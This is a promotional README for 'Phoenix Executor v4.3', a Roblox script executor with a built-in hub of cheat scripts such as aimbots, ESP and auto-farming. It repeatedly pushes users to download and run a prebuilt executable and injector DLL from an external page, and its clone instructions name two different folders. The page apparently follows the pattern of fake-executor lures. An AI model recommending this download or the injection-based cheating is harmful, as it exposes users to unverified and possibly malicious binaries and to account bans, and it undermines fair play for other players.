# Phoenix Executor PC v4.3 - Roblox Script Executor 2026

> **A compact Windows Lua execution utility for Roblox.** Built for straightforward script injection and backed by an in-app hub with 500+ community scripts. Small desktop footprint with auto-update support for 2026.

[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owenbaker1997/phoenix-script-executor-hub?style=flat-square)](https://github.com)

---

<p align="center">
  <a href="https://owenbaker1997.github.io/phoenix-script-executor-hub/">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Phoenix%20Executor-v4.3%20Latest-brightgreen?style=for-the-badge" alt="Download Phoenix Executor">
  </a>
</p>

> **[Direct Download - Phoenix Executor v4.3](https://owenbaker1997.github.io/phoenix-script-executor-hub/)**
> Windows 10 / 11 · 64-bit · Free · No Key Required

---

[Download Latest Build](https://owenbaker1997.github.io/phoenix-script-executor-hub/)

---

## Overview

Phoenix Executor is a Windows-first Lua scripting utility made for Roblox. Its interface is intentionally simple and lightweight, while still connecting directly to the Roblox client so custom scripts can be run without extra clutter. The emphasis is on dependable behavior and an easy workflow, making it approachable for beginners and practical for experienced users who want a stable execution setup.

Alongside the main executor, the package includes a curated script hub with more than 500 scripts spread across several categories. A one-click injection flow and persistent queue handling make it easier to chain and manage scripts in order. An integrated auto-update system helps keep the tool aligned with the latest Roblox changes without requiring manual maintenance.

---

## Features at a Glance

- **One-Click Injection** - Connect to the Roblox process immediately with a single action, without any complicated setup.
- **Built-in Script Hub** - Access 500+ community scripts that are grouped by category for easier browsing.
- **Persistent Queue System** - Line up multiple scripts for one-by-one execution, with controls to repeat or halt the queue.
- **Auto-Update Engine** - Checks for new releases and retrieves updates automatically to stay current with Roblox patches.
- **Multi-Language UI** - Offers the interface in multiple languages for a wider international audience.
- **Ultra-Light Footprint** - Designed to stay lean and use very little system memory and CPU, even on modest hardware.
- **Batch Execution Mode** - Run several scripts together with adjustable delay timing between them.
- **Built-in Debugger** - Includes debugging utilities to help test and troubleshoot scripts before use.

---

## Supported Games & Scripts

| Game | Script Categories |
|------|-------------------|
| Adopt Me! | Auto-farm, pet management, trading utilities |
| Brookhaven | Teleportation, vehicle spawners, roleplay tools |
| Blox Fruits | Auto-farming, fruit finder, stat management |
| Jailbreak | Prison escape, vehicle control, cash farming |
| Tower of Hell | Auto-complete, obstacle bypass, speed modifiers |
| Pet Simulator X | Coin farming, pet hatching, trading automation |
| Arsenal | Aimbot, ESP, weapon unlocks, player tracking |

---

## System Requirements

| Component | Minimum Specification |
|-----------|----------------------|
| Operating System | Windows 10 (64-bit) or Windows 11 |
| Processor | Intel Core i3 or AMD equivalent |
| RAM | 4 GB |
| Storage | 150 MB available space |
| .NET Framework | .NET 6.0 or higher |
| Roblox | Latest stable version installed |
| Internet | Required for script hub and updates |

---

## Quick Start

Clone the repository to your local machine:

```bash
git clone https://github.com/owenbaker1997/phoenix-script-executor-hub.git
cd phoenix-executor-hub
```

Start the executor directly:

```bash
.\PhoenixExecutor.exe
```

Roblox should be open before you try to inject. The app automatically finds the Roblox process and shows it in the connection panel.

---

## Script Hub - Popular Searches 2026

- Auto-farm scripts for Blox Fruits and Pet Simulator X
- GUI-based teleportation tools for Brookhaven RP
- ESP and player tracking scripts for Arsenal
- Instant completion scripts for Tower of Hell
- Trading automation for Adopt Me! and Pet Simulator X
- Cash farming utilities for Jailbreak
- Custom Lua script templates for beginners

---

## Architecture Overview

```
Phoenix-Executor-Windows/
├── bin/
│   ├── PhoenixExecutor.exe
│   ├── injector.dll
│   └── updater.exe
├── scripts/
│   ├── hub/
│   │   ├── categories.json
│   │   └── scripts.db
│   └── user/
│       └── (custom scripts)
├── config/
│   ├── settings.json
│   ├── language_pack/
│   └── queue_profiles.json
├── logs/
│   └── executor.log
├── README.md
└── LICENSE
```

---

## FAQ

**Is Phoenix Executor safe to use?**  
This software is distributed as-is for learning and testing. How it is used is entirely the user's responsibility.

**Does it work with the latest Roblox update?**  
The auto-update engine is intended to keep the tool compatible with current Roblox releases. If an update causes issues, a refreshed build should arrive soon after.

**How does Phoenix Executor compare to other executors?**  
Its design centers on being lightweight, with a curated script hub, queue management, and multi-language support, rather than adding unnecessary extras that increase size and complexity.

**Will my Roblox account be at risk?**  
Any third-party Roblox tool can involve risk. Using alternate accounts for testing and respecting Roblox's terms of service is recommended.

**Where are my scripts stored locally?**  
User scripts are kept in the `scripts/user/` folder inside the install directory. The script hub database lives in `scripts/hub/`.

---

## Roadmap - 2026

- [x] One-click injection system
- [x] Script hub with 500+ scripts
- [ ] Cloud script synchronization across devices
- [ ] Custom theme editor for UI personalization
- [ ] Plugin API for third-party extensions
- [ ] Mobile companion app for remote script management

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.

---

<p align="center">
  <i>Phoenix Executor v4.3 - Lightweight Lua execution for Roblox, built for reliability and ease of use.</i>
</p>
